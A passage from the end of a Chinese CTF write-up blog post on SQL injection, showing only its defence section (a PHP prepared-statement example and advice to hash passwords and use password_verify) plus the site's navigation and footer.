+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#CDD6F4">$stmt </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> $con</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">prepare</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"</span><span style="color:#CBA6F7">SELECT</span><span style="color:#CBA6F7"> password</span><span style="color:#CBA6F7"> FROM</span><span style="color:#CDD6F4"> users </span><span style="color:#CBA6F7">WHERE</span><span style="color:#CDD6F4"> username</span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4">? </span><span style="color:#CBA6F7">AND</span><span style="color:#CBA6F7"> password</span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4">?</span><span style="color:#A6E3A1">"</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CDD6F4">$stmt</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">bind_param</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">"ss"</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $username</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> $password</span><span style="color:#9399B2">);</span></span></code></pre>
+<p>真正的修复只有一条：<strong>预编译参数化</strong>。黑名单永远可以被绕过。</p>
+<p>另外 <code>$row['password'] === $password</code> 这种「明文密码比较」本身也不该出现，密码应该哈希存储、用 <code>password_verify</code> 比较。</p> </div> <nav class="series-navigation" aria-label="系列文章导航" data-astro-cid-gysqo7gh> <div class="series-navigation-heading" data-astro-cid-gysqo7gh> <div data-astro-cid-gysqo7gh><span class="section-kicker" data-astro-cid-gysqo7gh>继续阅读</span><h2 data-astro-cid-gysqo7gh>CTF Web 基础三题</h2></div> <a class="series-all" href="/series/#ctf-web-basics" data-astro-cid-gysqo7gh>完整目录 <span aria-hidden="true" data-astro-cid-gysqo7gh>↗</span></a> </div> <div class="series-links" data-astro-cid-gysqo7gh> <div class="series-boundary" data-astro-cid-gysqo7gh><span class="series-direction" data-astro-cid-gysqo7gh>从这里开始</span><span data-astro-cid-gysqo7gh>这是系列的第一篇</span></div> <a class="series-link series-link--next" href="/posts/ctf-web-basics-2-ruby-open/" data-astro-cid-gysqo7gh> <span class="series-direction" data-astro-cid-gysqo7gh>下一篇 →</span><span class="series-name" data-astro-cid-gysqo7gh>CTF Web 基础三题（二）—— Ruby open 管道命令执行</span> </a> </div> </nav> <footer class="article-footer" data-astro-cid-gysqo7gh><a href="/archive/" data-astro-cid-gysqo7gh>← 返回全部文章</a><a href="#article-top" data-astro-cid-gysqo7gh>回到顶部 ↑</a></footer> </article> <aside class="reading-sidebar" aria-label="阅读辅助" data-astro-cid-gysqo7gh> <div class="toc-panel glass" data-astro-cid-gysqo7gh> <div class="toc-heading" data-astro-cid-gysqo7gh><h2 data-astro-cid-gysqo7gh>本文目录</h2><span data-reading-percent data-astro-cid-gysqo7gh>0%</span></div> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一一句话考点" data-toc-link data-astro-cid-gysqo7gh>一、一句话考点</a> </li><li data-astro-cid-gysqo7gh> <a href="#二题目长什么样" data-toc-link data-astro-cid-gysqo7gh>二、题目长什么样</a> </li><li data-astro-cid-gysqo7gh> <a href="#三为什么万能密码不行" data-toc-link data-astro-cid-gysqo7gh>三、为什么「万能密码」不行</a> </li><li data-astro-cid-gysqo7gh> <a href="#四过滤表被禁什么换什么" data-toc-link data-astro-cid-gysqo7gh>四、过滤表：被禁什么，换什么</a> </li><li data-astro-cid-gysqo7gh> <a href="#五建立-oracle先花-2-个请求" data-toc-link data-astro-cid-gysqo7gh>五、建立 oracle（先花 2 个请求）</a> </li><li data-astro-cid-gysqo7gh> <a href="#六提取算法每个字符-7-位" data-toc-link data-astro-cid-gysqo7gh>六、提取算法：每个字符 7 位</a> </li><li data-astro-cid-gysqo7gh> <a href="#七完整脚本节选" data-toc-link data-astro-cid-gysqo7gh>七、完整脚本（节选）</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩过的坑" data-toc-link data-astro-cid-gysqo7gh>八、踩过的坑</a> </li><li data-astro-cid-gysqo7gh> <a href="#九如果过滤再加一条" data-toc-link data-astro-cid-gysqo7gh>九、如果过滤再加一条</a> </li><li data-astro-cid-gysqo7gh> <a href="#十这类题怎么认" data-toc-link data-astro-cid-gysqo7gh>十、这类题怎么认</a> </li><li data-astro-cid-gysqo7gh> <a href="#十一防御写给自己以后修" data-toc-link data-astro-cid-gysqo7gh>十一、防御（写给自己以后修）</a> </li> </ol> </nav> <a class="toc-back-top" href="#article-top" data-astro-cid-gysqo7gh>回到顶部 <span aria-hidden="true" data-astro-cid-gysqo7gh>↑</span></a> </div> </aside> </div> <script type="module">const c=document.querySelector("[data-reading-content]");if(c){let S=function(){const e=window.scrollY;d=b.map(i=>i.getBoundingClientRect().top+e);const t=c.getBoundingClientRect();s=Math.max(0,t.top+e-150),y=Math.max(s+1,t.bottom+e-window.innerHeight+48),m=!1},x=function(){u=0,m&&S();const e=window.scrollY,t=Math.round(Math.max(0,Math.min(1,(e-s)/(y-s)))*1e3)/1e3,i=Math.round(t*100);t!==E&&(w&&(w.style.transform=`scaleX(${t})`),E=t),i!==A&&(M.forEach(n=>{n.textContent=`${i}%`}),A=i);let f=0,h=d.length-1,q=0;for(;f<=h;){const n=f+h>>>1;d[n]<=e+160?(q=n,f=n+1):h=n-1}const g=b[q]?.id??"";g!==l&&(r.get(l)?.forEach(n=>{n.removeAttribute("data-active"),n.removeAttribute("aria-current")}),r.get(g)?.forEach(n=>{n.setAttribute("data-active",""),n.setAttribute("aria-current","location")}),l=g)},a=function(){u||(u=window.requestAnimationFrame(x))},o=function(){m=!0,a()};const w=document.querySelector("[data-reading-progress]"),M=document.querySelectorAll("[data-reading-percent]"),p=document.querySelector("[data-mobile-toc]"),v=Array.from(document.querySelectorAll("[data-toc-link]")),r=new Map;v.forEach(e=>{const t=decodeURIComponent(e.hash.slice(1));r.set(t,[...r.get(t)??[],e])});const b=Array.from(c.querySelectorAll("h2[id], h3[id]")).filter(e=>r.has(e.id));let d=[],s=0,y=1,l="",A=-1,E=-1,u=0,m=!0;if(window.addEventListener("scroll",a,{passive:!0}),window.addEventListener("resize",o,{passive:!0}),window.addEventListener("hashchange",a),window.addEventListener("load",o,{once:!0}),"ResizeObserver"in window){const e=new ResizeObserver(o);e.observe(c);const t=document.querySelector("[data-reading-article]");t&&e.observe(t)}document.fonts?.ready.then(o),v.forEach(e=>{e.addEventListener("click",()=>{p?.contains(e)&&(p.open=!1,o());const t=document.getElementById(decodeURIComponent(e.hash.slice(1)));t&&(t.setAttribute("tabindex","-1"),window.requestAnimationFrame(()=>t.focus({preventScroll:!0})))})}),a()}</script>  </main> <footer class="site-footer" data-astro-cid-sz7xmlte> <div class="footer-inner" data-astro-cid-sz7xmlte> <div class="footer-identity" data-astro-cid-sz7xmlte><a href="/" data-astro-cid-sz7xmlte>yyg<span aria-hidden="true" data-astro-cid-sz7xmlte>.</span></a><p data-astro-cid-sz7xmlte>在这里，留下一点思考。</p></div> <div class="footer-end" data-astro-cid-sz7xmlte> <nav class="footer-links" aria-label="联系与订阅" data-astro-cid-sz7xmlte><a href="https://github.com/yangpeter26-bot" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>GitHub <span aria-hidden="true" data-astro-cid-sz7xmlte>↗</span></a><a href="/rss.xml" data-astro-cid-sz7xmlte>RSS</a><a href="mailto:yangpeter26@gmail.com" data-astro-cid-sz7xmlte>联系</a></nav> <p data-astro-cid-sz7xmlte>© 2026 yyg<span class="footer-dot" aria-hidden="true" data-astro-cid-sz7xmlte>·</span>记录，学习，继续向前。</p> </div> </div> </footer>  <dialog class="search-dialog" id="search-dialog" aria-labelledby="search-heading" data-astro-cid-otpdt6jm> <div class="search-panel" data-astro-cid-otpdt6jm> <div class="search-topline" data-astro-cid-otpdt6jm><h2 id="search-heading" data-astro-cid-otpdt6jm>找一点想读的</h2><button type="button" class="search-close" id="search-close" aria-label="关闭搜索" data-astro-cid-otpdt6jm><svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><path d="m6 6 12 12M18 6 6 18" data-astro-cid-otpdt6jm></path></svg></button></div> <label class="search-input-wrap" for="site-search" data-astro-cid-otpdt6jm> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-otpdt6jm></circle><path d="m16 16 4.5 4.5" data-astro-cid-otpdt6jm></path></svg> <input id="site-search" type="search" aria-label="搜索文章关键词" placeholder="搜索标题、摘要、标签或系列…" autocomplete="off" spellcheck="false" aria-controls="search-results" aria-describedby="search-status" data-astro-cid-otpdt6jm> <kbd aria-hidden="true" data-astro-cid-otpdt6jm>esc</kbd> </label> <div class="search-status-row" data-astro-cid-otpdt6jm><p id="search-status" role="status" aria-live="polite" data-astro-cid-otpdt6jm>输入关键词，寻找一篇文章。</p><button type="button" id="search-retry" hidden data-astro-cid-otpdt6jm>重新加载</button></div> <ul class="search-results" id="search-results" aria-label="文章搜索结果" data-astro-cid-otpdt6jm></ul> <div class="search-empty" id="search-empty" hidden data-astro-cid-otpdt6jm><span aria-hidden="true" data-astro-cid-otpdt6jm>⌕</span><p data-astro-cid-otpdt6jm>还没有找到相关内容</p><small data-astro-cid-otpdt6jm>试试短一点的关键词，比如「学习」「CNN」。</small></div> <div class="search-bottomline" data-astro-cid-otpdt6jm><span data-astro-cid-otpdt6jm>在这个小站里，发现一点新东西。</span><span class="keyboard-hint" data-astro-cid-otpdt6jm><kbd data-astro-cid-otpdt6jm>⌘</kbd> / <kbd data-astro-cid-otpdt6jm>Ctrl</kbd> <kbd data-astro-cid-otpdt6jm>K</kbd></span></div> </div> </dialog>  <script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.pFLQCv6D.js"></script> </body> </html>  
